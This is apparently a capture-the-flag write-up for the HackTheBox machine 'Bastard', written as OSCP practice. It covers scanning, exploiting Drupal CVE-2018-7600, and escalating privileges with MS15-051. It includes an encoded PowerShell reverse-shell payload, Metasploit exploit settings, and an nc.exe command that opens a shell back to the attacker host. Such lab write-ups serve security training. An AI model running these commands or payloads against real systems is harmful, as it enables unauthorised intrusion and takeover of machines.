# Bastard - OSCP Boxe

![Untitled](Bastard%20-%20OSCP%20Boxe%2087ae607de58c46b18f97e0f08b6e84de/Untitled.png)

## **Scanning :**

scan target to get open ports and services. 

```bash
> nmap -sS -sC -sV -T4 10.10.10.9 -Pn

80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to Bastard | Bastard
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
```

scan all ports. 

```bash
80/tcp    open  http
135/tcp   open  msrpc
49154/tcp open  unknown
```

## **Enumeration Drapul :**

Get acces on the web app, this web app use `**drupal**` CMS. 

![Untitled](Bastard%20-%20OSCP%20Boxe%2087ae607de58c46b18f97e0f08b6e84de/Untitled%201.png)

use `**whatweb**` to grad more informations about the web page. 

```bash
> whatweb -a 3 http://10.10.10.9/       
http://10.10.10.9/ [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.9], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], Microsoft-IIS[7.5], PHP[5.3.28,], PasswordField[pass], Script[text/javascript], Title[Welcome to Bastard | Bastard], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.3.28, ASP.NET]
```

Get the version of drupal : 

```bash
> curl -s http://10.10.10.9/CHANGELOG.txt | grep -m2 ""

Drupal 7.54, 2017-02-01
```

Search on google a potential exploit and i find the **`CVE-2018-7600` .**

[GitHub - pimps/CVE-2018-7600: Exploit for Drupal 7 <= 7.57 CVE-2018-7600](https://github.com/pimps/CVE-2018-7600)

## **Exploitation :**

clone the repo and run the exploit. 

```bash
> git clone https://github.com/pimps/CVE-2018-7600

# run exploit and get command execution
> python drupa7-CVE-2018-7600.py http://10.10.10.9/ -c whoami
```

![Untitled](Bastard%20-%20OSCP%20Boxe%2087ae607de58c46b18f97e0f08b6e84de/Untitled%202.png)

run reverse shell with powershell base64 payload. 

```bash
> python drupa7-CVE-2018-7600.py http://10.10.10.9/ -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOQAiACwAMQAzADMANwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA='
```

![Untitled](Bastard%20-%20OSCP%20Boxe%2087ae607de58c46b18f97e0f08b6e84de/Untitled%203.png)

## **Privileges Escalation :**

Run Windows Exploit Suggester to find kernel exploit on the kernel version. 

First you need to creat file who contain the result of `**systeminfo**` command on windows target machine.

```bash
Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3582622-84461
Original Install Date:     18/3/2017, 7:04:46 ��
System Boot Time:          15/4/2024, 11:25:15 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.578 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.607 MB
Virtual Memory: In Use:    488 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.9
```

Because of what python library problem I am forced to use `**metasploit**` module to list kernel exploits 

![Untitled](Bastard%20-%20OSCP%20Boxe%2087ae607de58c46b18f97e0f08b6e84de/Untitled%204.png)

lets exploit `**ms15_051**` with metasploit. 

Configure the exploit.

```bash
> use exploit/windows/local/ms15_051_client_copy_image

> set session 1

> set target 1

> set payload windows/x64/shell/reverse_tcp

> run
```

![Untitled](Bastard%20-%20OSCP%20Boxe%2087ae607de58c46b18f97e0f08b6e84de/Untitled%205.png)

## **Exploit `ms15_051` Manually.**

i grab the compile exploit from this ressources. 

[windows-kernel-exploits/MS15-051/README.md at master · SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/README.md)

So download the **`.zip`** file.

[https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip)

Open a smbserver with **`impacket-smbserver`** to store the exploit and for facilitate the running compatibility

```bash
# you need run the smbserver on the same directory to the exploit.
> impacket-smbserver share .
```

Now from the windows machine connect on the smb share on run the exploit binary.

```bash
> \\10.10.14.9\share\ms15-051x64.exe whoami
```

![Untitled](Bastard%20-%20OSCP%20Boxe%2087ae607de58c46b18f97e0f08b6e84de/Untitled%206.png)

Get a reverse shell with **`nc.exe`** binary.

```bash
\\10.10.14.9\share\ms15-051x64.exe "\\10.10.14.9\share\nc.exe 10.10.14.9 1338 -e cmd"
```

![Untitled](Bastard%20-%20OSCP%20Boxe%2087ae607de58c46b18f97e0f08b6e84de/Untitled%207.png)